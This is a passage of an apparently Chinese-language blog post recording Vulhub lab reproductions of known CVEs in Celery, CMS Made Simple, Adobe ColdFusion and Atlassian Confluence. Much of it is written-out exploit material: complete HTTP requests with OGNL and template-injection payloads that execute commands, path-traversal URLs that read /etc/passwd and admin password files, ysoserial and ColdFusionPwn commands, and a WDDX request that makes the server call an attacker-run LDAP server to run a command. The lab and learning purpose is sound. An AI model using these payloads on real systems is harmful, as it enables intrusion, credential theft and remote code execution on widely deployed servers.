href="https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A">https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A</a></li></ul></blockquote><p>8080端口的容器一开就死 跳了</p><h1 id="Celery"><a href="#Celery" class="headerlink" title="Celery <4.0 Redis未授权访问+Pickle反序列化利用"></a>Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用</h1><blockquote><p>Celery 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。</p><p>在Celery &lt; 4.0版本默认使用Pickle进行任务消息的序列化传递，当所用队列服务（比如Redis、RabbitMQ、RocketMQ等等等）存在未授权访问问题时，可利用Pickle反序列化漏洞执行任意代码。</p></blockquote><h2 id="漏洞复现-14"><a href="#漏洞复现-14" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>漏洞利用脚本<code>exploit.py</code>仅支持在python3下使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip install redispython exploit.py [主机IP]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看结果：</p><pre class="line-numbers language-none"><code class="language-none">docker compose logs celery<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/40.jpg" alt="40"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/41.jpg" alt="41"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/42.jpg" alt="42"></p><h1 id="CGI-HTTPoxy漏洞（CVE-2016-5385）（未完成）"><a href="#CGI-HTTPoxy漏洞（CVE-2016-5385）（未完成）" class="headerlink" title="CGI HTTPoxy漏洞（CVE-2016-5385）（未完成）"></a>CGI HTTPoxy漏洞（CVE-2016-5385）（未完成）</h1><blockquote><p>根据RFC 3875规定，CGI（fastcgi）要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p><p>PHP5.6.24版本修复了该漏洞，不会再将<code>Proxy</code>放入环境变量中。本环境使用PHP 5.6.23为例。</p><p>当然，该漏洞不止影响PHP，所有以CGI或Fastcgi运行的程序理论上都受到影响。CVE-2016-5385是PHP的CVE，HTTPoxy所有的CVE编号如下：</p><ul><li>CVE-2016-5385: PHP</li><li>CVE-2016-5386: Go</li><li>CVE-2016-5387: Apache HTTP Server</li><li>CVE-2016-5388: Apache Tomcat</li><li>CVE-2016-6286: spiffy-cgi-handlers for CHICKEN</li><li>CVE-2016-6287: CHICKEN’s http-client</li><li>CVE-2016-1000104: mod_fcgi</li><li>CVE-2016-1000105: Nginx cgi script</li><li>CVE-2016-1000107: Erlang inets</li><li>CVE-2016-1000108: YAWS</li><li>CVE-2016-1000109: HHVM FastCGI</li><li>CVE-2016-1000110: Python CGIHandler</li><li>CVE-2016-1000111: Python Twisted</li><li>CVE-2016-1000212: lighttpd</li></ul><p>参考链接：</p><ul><li><a href="https://httpoxy.org/aaaaahttp://www.laruence.com/2016/07/19/3101.html">https://httpoxy.org/aaaaahttp://www.laruence.com/2016/07/19/3101.html</a></li></ul></blockquote><h1 id="CMS-Made-Simple-CMSMS-2-2-10-前台SQL注入漏洞（CVE-2019-9053）"><a href="#CMS-Made-Simple-CMSMS-2-2-10-前台SQL注入漏洞（CVE-2019-9053）" class="headerlink" title="CMS Made Simple (CMSMS) < 2.2.10 前台SQL注入漏洞（CVE-2019-9053）"></a>CMS Made Simple (CMSMS) &lt; 2.2.10 前台SQL注入漏洞（CVE-2019-9053）</h1><blockquote><p>CMS Made Simple（CMSMS）是一个免费的开放源码内容管理系统，为开发人员、程序员和网站所有者提供基于网络的开发和管理功能。</p><p>在 2.2.9.1 之前的版本中，CMS Made Simple 存在一个未验证的 SQL 注入漏洞，攻击者可利用该漏洞获取管理员密码或密码重置令牌。结合后台的 SSTI 漏洞（<a href="https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2021-26120">CVE-2021-26120</a>），攻击者可在目标服务器上执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></li><li><a href="https://srcincite.io/pocs/cve-2021-26120.py.txt">https://srcincite.io/pocs/cve-2021-26120.py.txt</a></li></ul></blockquote><h2 id="漏洞复现-15"><a href="#漏洞复现-15" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先是配置<br>环境环境启动后，你需要访问<code>http://your-ip/install.php</code>并安装CMS服务。<br>安装过程请根据页面中的安装向导来进行，其中MySQL数据库的地址是<code>db</code>，数据库名是<code>cmsms</code>，账号和密码均为<code>root</code>。</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/43.jpg" alt="43"></p><blockquote><p>使用<a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a>中的脚本来利用SQL注入漏洞：</p></blockquote><pre class="line-numbers language-none"><code class="language-none">python2 poc.py -u http://127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注:kali自带python2 3 但是3运行该py会报错 2又缺一些组件 pip2又不自带 安装很是麻烦<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/44.jpg" alt="44"><br>等他程序自己把密码爆出来就完事了</p><h1 id="CMS-Made-Simple-CMSMS-前台代码执行漏洞（CVE-2021-26120）"><a href="#CMS-Made-Simple-CMSMS-前台代码执行漏洞（CVE-2021-26120）" class="headerlink" title="CMS Made Simple (CMSMS) 前台代码执行漏洞（CVE-2021-26120）"></a>CMS Made Simple (CMSMS) 前台代码执行漏洞（CVE-2021-26120）</h1><blockquote><p>CMS Made Simple（CMSMS）是一个免费的开放源码内容管理系统，为开发人员、程序员和网站所有者提供基于网络的开发和管理功能。</p><p>Smarty 3.1.39 之前的版本允许在 <code>{function name=</code> 子串后注入PHP代码，导致代码注入漏洞，该漏洞即为CVE-2021-26120。</p><p>CMS Made Simple 版本 &lt;= 2.2.15，拥有设计师权限的用户可以在后台利用服务端模板注入漏洞，即为前面提到的CVE-2021-26120。</p><p>因此，如果CMSMS版本低于2.2.9.1，未授权的攻击者可以结合<a href="https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2019-9053">CVE-2019-9053</a>和CVE-2021-26120漏洞，在服务器上执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></li><li><a href="https://srcincite.io/pocs/cve-2021-26120.py.txt">https://srcincite.io/pocs/cve-2021-26120.py.txt</a></li></ul></blockquote><h2 id="漏洞复现-16"><a href="#漏洞复现-16" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先是配置<br>环境环境启动后，你需要访问<code>http://your-ip/install.php</code>并安装CMS服务。<br>安装过程请根据页面中的安装向导来进行，其中MySQL数据库的地址是<code>db</code>，数据库名是<code>cmsms</code>，账号和密码均为<code>root</code>。</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/43.jpg" alt="43"></p><blockquote><p>使用<a href="https://srcincite.io/pocs/cve-2021-26120.py.txt">https://srcincite.io/pocs/cve-2021-26120.py.txt</a>中分享的<a href="poc.py">POC</a>，可以使用SQL注入漏洞重置管理员密码，并执行任意命令：</p><pre class="line-numbers language-none"><code class="language-none">python poc.py 127.0.0.1 / id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/45.jpg" alt="45"></p><p>可见，<code>id</code>命令已被成功执行。</p><h1 id="Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><a href="#Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）" class="headerlink" title="Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）"></a>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</h1><blockquote><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。</p></blockquote><h2 id="漏洞复现-17"><a href="#漏洞复现-17" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>直接访问<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code>，即可读取文件<code>/etc/passwd</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/46.jpg" alt="46"></p><blockquote><p>读取后台管理员密码<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/47.jpg" alt="47"></p><h1 id="Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）"><a href="#Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）" class="headerlink" title="Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）"></a>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</h1><blockquote><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：Adobe ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update 11及之前的版本，ColdFusion 10 Update 22及之前的版本。</p><p>参考链接：</p><ul><li><a href="https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html">https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html</a></li><li><a href="https://www.exploit-db.com/exploits/43993">https://www.exploit-db.com/exploits/43993</a></li><li><a href="https://github.com/codewhitesec/ColdFusionPwn">https://github.com/codewhitesec/ColdFusionPwn</a></li></ul></blockquote><h2 id="漏洞复现-18"><a href="#漏洞复现-18" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我们使用参考链接中的<a href="https://github.com/codewhitesec/ColdFusionPwn">ColdFusionPwn</a>工具来生成POC：</p><pre class="line-numbers language-none"><code class="language-none">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/success' poc.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>POC生成于poc.ser文件中，将POC作为数据包body发送给<code>http://your-ip:8500/flex2gateway/amf</code>，Content-Type为application/x-amf：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/48.jpg" alt="48"><br>这里burp用的是“粘贴文件至”来发送的数据包 不然容易出现错误<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/49.jpg" alt="49"><br>一般来说正常返回完文件也会被正常创建 但多半是ysoserial版本不对 没有正常创建</p><blockquote><p>进入容器中，发现<code>/tmp/success</code>已成功创建：</p><p>将POC改成<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">反弹命令</a>，成功拿到shell：</p></blockquote><h1 id="Adobe-ColdFusion-本地文件包含漏洞（CVE-2023-26360）"><a href="#Adobe-ColdFusion-本地文件包含漏洞（CVE-2023-26360）" class="headerlink" title="Adobe ColdFusion 本地文件包含漏洞（CVE-2023-26360）"></a>Adobe ColdFusion 本地文件包含漏洞（CVE-2023-26360）</h1><blockquote><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion 2018 Update 15 和 2021 Update 5 版本及以前，存在一处文件包含漏洞。攻击者可以利用该漏洞在服务器上执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://xz.aliyun.com/t/13392">https://xz.aliyun.com/t/13392</a></li></ul></blockquote><h2 id="漏洞复现-19"><a href="#漏洞复现-19" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>发送如下请求即可读取文件<code>/proc/self/environ</code>：</p><pre class="line-numbers language-none"><code class="language-none">POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;_cfclient=true HTTP/1.1Host: localhost:8500Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 82Content-Type: application/x-www-form-urlencoded_variables={"_metadata":{"classname":"../../../../../../../../proc/self/environ"}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>你可以在返回包中找到Adobe ColdFusion的根目录<code>/opt/coldfusion/cfusion</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/50.jpg" alt="50"></p><blockquote><p>从<code>../../../../../../../../opt/coldfusion/cfusion/lib/password.properties</code>中读取服务器密码：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/51.jpg" alt="51"></p><blockquote><p>想要利用文件包含漏洞执行任意代码，需要先发送如下请求来写入CFM脚本：</p><pre class="line-numbers language-none"><code class="language-none">POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;_cfclient=true HTTP/1.1Host: localhost:8500Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 67Content-Type: application/x-www-form-urlencoded_variables=&lt;cfexecute name='id' outputFile='/tmp/success' &gt;&lt;/cfexecute&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后包含日志文件，执行该CFM代码：</p><pre class="line-numbers language-none"><code class="language-none">POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;_cfclient=true HTTP/1.1Host: localhost:8500Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 111Content-Type: application/x-www-form-urlencoded_variables={"_metadata":{"classname":"../../../../../../../../opt/coldfusion/cfusion/logs/coldfusion-out.log"}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，<code>id</code>命令的执行结果已经被写入<code>/tmp/success</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/52.jpg" alt="52"></p><h1 id="Adobe-ColdFusion-XML-反序列化命令执行漏洞（CVE-2023-29300）"><a href="#Adobe-ColdFusion-XML-反序列化命令执行漏洞（CVE-2023-29300）" class="headerlink" title="Adobe ColdFusion XML 反序列化命令执行漏洞（CVE-2023-29300）"></a>Adobe ColdFusion XML 反序列化命令执行漏洞（CVE-2023-29300）</h1><blockquote><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion在2018.0.16、2021.0.6、2023.0.0.330468版本及以前，存在一处XML反序列化漏洞。攻击者可以利用该漏洞调用Java中任意setter方法，最终执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://blog.projectdiscovery.io/adobe-coldfusion-rce/">https://blog.projectdiscovery.io/adobe-coldfusion-rce/</a></li><li><a href="https://xz.aliyun.com/t/13413">https://xz.aliyun.com/t/13413</a></li></ul></blockquote><h2 id="漏洞复现-20"><a href="#漏洞复现-20" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>要利用这个漏洞，需要先找到一个可利用的setter方法作为Gadget。最常见的Gadget是利用<code>com.sun.rowset.JdbcRowSetImpl</code>来进行JNDI注入，并执行任意命令。</p><p>首先，启动一个恶意JNDI服务器，并加载<code>CommonsBeanutils1</code>作为内层反序列化Gadget。Github上有数个工具可以使用，比如<a href="https://github.com/rebeyond/JNDInjector/releases">https://github.com/rebeyond/JNDInjector/releases</a>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/53.jpg" alt="53"></p><blockquote><p>然后，将恶意LDAP地址替换到如下请求中发送：</p><pre class="line-numbers language-none"><code class="language-none">POST /CFIDE/adminapi/accessmanager.cfc?method=foo&amp;_cfclient=true HTTP/1.1Host: localhostAccept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 333argumentCollection=&lt;wddxPacket version='1.0'&gt;&lt;header/&gt;&lt;data&gt;&lt;struct type='xcom.sun.rowset.JdbcRowSetImplx'&gt;&lt;var name='dataSourceName'&gt;&lt;string&gt;ldap://192.168.0.196/PJlkCbYLJV/CommonsBeanutils1/Exec/eyJjbWQiOiJ0b3VjaCAvdG1wL3dvd3dlZGlkaXQifQ==&lt;/string&gt;&lt;/var&gt;&lt;var name='autoCommit'&gt;&lt;boolean value='true'/&gt;&lt;/var&gt;&lt;/struct&gt;&lt;/data&gt;&lt;/wddxPacket&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>localhost处改端口似乎是必要的 改完就成功复现了</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/54.jpg" alt="54"></p><blockquote><p>可见，<code>touch /tmp/success</code>已被成功执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/55.jpg" alt="55"></p><h1 id="Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）"><a href="#Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）" class="headerlink" title="Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）"></a>Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统，其6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令。</p><p>参考资料：</p><ul><li><a href="https://paper.seebug.org/884/">https://paper.seebug.org/884/</a></li><li><a href="https://jira.atlassian.com/browse/CONFSERVER-57974">https://jira.atlassian.com/browse/CONFSERVER-57974</a></li></ul></blockquote><h2 id="漏洞复现-21"><a href="#漏洞复现-21" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>环境启动后，访问<code>http://your-ip:8090</code>会进入安装引导，选择“Trial installation”，之后会要求填写license key。点击“Get an evaluation license”，去Atlassian官方申请一个Confluence Server的测试证书：</p><p>然后点击Next安装即可。这一步小内存VPS可能安装失败或时间较长（建议使用4G内存以上的机器进行安装与测试），请耐心等待。</p><p>如果提示填写cluster node，路径填写<code>/home/confluence</code>即可：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/56.jpg" alt="56"></p><blockquote><p>发送如下数据包，即可读取文件<code>web.xml</code>：</p><pre class="line-numbers language-none"><code class="language-none">POST /rest/tinymce/1/macro/preview HTTP/1.1Host: localhost:8090Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeReferer: http://localhost:8090/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;Content-Type: application/json; charset=utf-8Content-Length: 176{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/57.jpg" alt="57"></p><h1 id="Atlassian-Confluence-OGNL表达式注入命令执行漏洞（CVE-2021-26084）"><a href="#Atlassian-Confluence-OGNL表达式注入命令执行漏洞（CVE-2021-26084）" class="headerlink" title="Atlassian Confluence OGNL表达式注入命令执行漏洞（CVE-2021-26084）"></a>Atlassian Confluence OGNL表达式注入命令执行漏洞（CVE-2021-26084）</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统，其部分版本中存在OGNL表达式注入漏洞。攻击者可以通过这个漏洞，无需任何用户的情况下在目标Confluence中执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html">https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html</a></li><li><a href="https://jira.atlassian.com/browse/CONFSERVER-67940">https://jira.atlassian.com/browse/CONFSERVER-67940</a></li><li><a href="https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md">https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md</a></li><li><a href="https://github.com/h3v0x/CVE-2021-26084_Confluence">https://github.com/h3v0x/CVE-2021-26084_Confluence</a></li></ul></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p>有多个接口可以触发这个OGNL表达式注入漏洞。</p><h3 id="pages-doenterpagevariables-action"><a href="#pages-doenterpagevariables-action" class="headerlink" title="/pages/doenterpagevariables.action"></a>/pages/doenterpagevariables.action</h3><p>这个接口不需要登录即可利用，发送如下数据包，即可看到<code>233*233</code>已被执行：</p><pre class="line-numbers language-none"><code class="language-none">POST /pages/doenterpagevariables.action HTTP/1.1Host: your-ip:8090Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 47queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/58.jpg" alt="58"></p><blockquote><p>执行任意命令：</p><pre class="line-numbers language-none"><code class="language-none">queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022id%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/59.jpg" alt="59"></p><blockquote><h3 id="pages-createpage-entervariables-action"><a href="#pages-createpage-entervariables-action" class="headerlink" title="/pages/createpage-entervariables.action"></a>/pages/createpage-entervariables.action</h3><p>这个路径也不需要用户登录：</p><pre class="line-numbers language-none"><code class="language-none">POST /pages/createpage-entervariables.action HTTP/1.1Host: your-ip:8090Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 47queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pages-createpage-action"><a href="#pages-createpage-action" class="headerlink" title="/pages/createpage.action"></a>/pages/createpage.action</h3><p>这个接口需要一个可以创建页面的用户权限：</p><pre class="line-numbers language-none"><code class="language-none">GET /pages/createpage.action?spaceKey=EX&amp;src=quick-create&amp;queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027 HTTP/1.1Host: 192.168.1.162:8090Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.1.162:8090/template/custom/content-editor.vmAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: JSESSIONID=7B35600F54A9E303CE8C277ED960E1E7; seraph.confluence=524289%3A2ac32a308478b9cb9f0e351a12470faa4f2a928aConnection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h1 id="Confluence-OGNL表达式注入命令执行漏洞（CVE-2022-26134）"><a href="#Confluence-OGNL表达式注入命令执行漏洞（CVE-2022-26134）" class="headerlink" title="Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）"></a>Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统。2022年6月2日Atlassian官方发布了一则安全更新，通告了一个严重且已在野利用的代码执行漏洞，攻击者利用这个漏洞即可无需任何条件在Confluence中执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html">https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html</a></li><li><a href="https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis">https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis</a></li></ul></blockquote><h2 id="漏洞复现-22"><a href="#漏洞复现-22" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>该漏洞利用方法十分简单，直接发送如下请求即可执行任意命令，并在HTTP返回头中获取执行结果：</p><pre class="line-numbers language-none"><code class="language-none">GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: your-ip:8090Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/60.jpg" alt="60"></p><h1 id="Confluence-属性覆盖导致权限绕过漏洞-CVE-2023-22515"><a href="#Confluence-属性覆盖导致权限绕过漏洞-CVE-2023-22515" class="headerlink" title="Confluence 属性覆盖导致权限绕过漏洞 (CVE-2023-22515)"></a>Confluence 属性覆盖导致权限绕过漏洞 (CVE-2023-22515)</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统。</p><p>2023年10月4日，Atlassian官方发布了对于CVE-2023-22515漏洞的补丁。这个漏洞是由属性覆盖导致，利用该漏洞攻击者可以重新执行Confluence安装流程并增加管理员账户。</p><p>该漏洞不影响8.0.0以前的版本。</p><p>参考链接：</p><ul><li><a href="https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html">https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html</a></li><li><a 